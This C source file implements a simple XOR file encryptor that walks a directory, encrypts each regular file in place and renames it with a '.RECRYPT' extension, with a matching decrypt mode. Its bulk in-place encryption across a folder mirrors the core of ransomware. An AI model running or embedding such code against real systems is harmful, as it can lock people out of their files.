#include "crypto.h"

#define ENCRYPTION_EXTENSION ".RECRYPT"

void xor_encrypt(const char *key, unsigned char *data, size_t data_len) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

void process_file(const char *file_path, const char *key, int decrypt_mode) {
    FILE *file = fopen(file_path, "rb+");
    if (!file) {
        perror("Error opening file");
        return;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);

    if (file_size <= 0) {
        fclose(file);
        return;
    }

    unsigned char *buffer = (unsigned char *)malloc(file_size);
    if (!buffer) {
        perror("Memory allocation failed");
        fclose(file);
        return;
    }

    fread(buffer, 1, file_size, file);
    xor_encrypt(key, buffer, file_size);
    rewind(file);
    fwrite(buffer, 1, file_size, file);

    free(buffer);
    fclose(file);

    char new_file_name[BUFFER_SIZE];

    if (decrypt_mode) {
        // Decryption: Remove .RECRYPT extension
        size_t path_len = strlen(file_path);
        size_t ext_len = strlen(ENCRYPTION_EXTENSION);

        if (path_len > ext_len && strcmp(file_path + path_len - ext_len, ENCRYPTION_EXTENSION) == 0) {
            snprintf(new_file_name, sizeof(new_file_name), "%.*s", (int)(path_len - ext_len), file_path);

            if (rename(file_path, new_file_name) == 0) {
                printf("Decrypted file restored to: %s\n", new_file_name);
            } else {
                perror("Error restoring decrypted file name");
            }
        }
    } else {
        // Encryption: Add .RECRYPT extension
        snprintf(new_file_name, sizeof(new_file_name), "%s%s", file_path, ENCRYPTION_EXTENSION);

        if (rename(file_path, new_file_name) == 0) {
            printf("Encrypted file renamed to: %s\n", new_file_name);
        } else {
            perror("Error renaming encrypted file");
        }
    }
}

void process_directory(const char *directory_path, const char *key, int decrypt_mode) {
    DIR *dir = opendir(directory_path);
    if (!dir) {
        perror("Failed to open directory");
        return;
    }

    struct dirent *entry;
    char full_path[BUFFER_SIZE];

    while ((entry = readdir(dir)) != NULL) {
        snprintf(full_path, BUFFER_SIZE, "%s/%s", directory_path, entry->d_name);

        struct stat file_stat;
        if (stat(full_path, &file_stat) == 0 && S_ISREG(file_stat.st_mode)) {
            if (!decrypt_mode) {
                // Skip already encrypted files
                size_t path_len = strlen(full_path);
                size_t ext_len = strlen(ENCRYPTION_EXTENSION);

                if (path_len > ext_len && strcmp(full_path + path_len - ext_len, ENCRYPTION_EXTENSION) == 0) {
                    printf("Skipping already encrypted file: %s\n", full_path);
                    continue;
                }
            }
            process_file(full_path, key, decrypt_mode);
        }
    }

    closedir(dir);
}

// Wrapper function to maintain compatibility
void xor_encrypt_decrypt(const char *input_file, const char *output_file, const char *key) {
    process_file(input_file, key, 0); // 0 for encryption
    if (output_file) {
        process_file(output_file, key, 1); // 1 for decryption
    }
}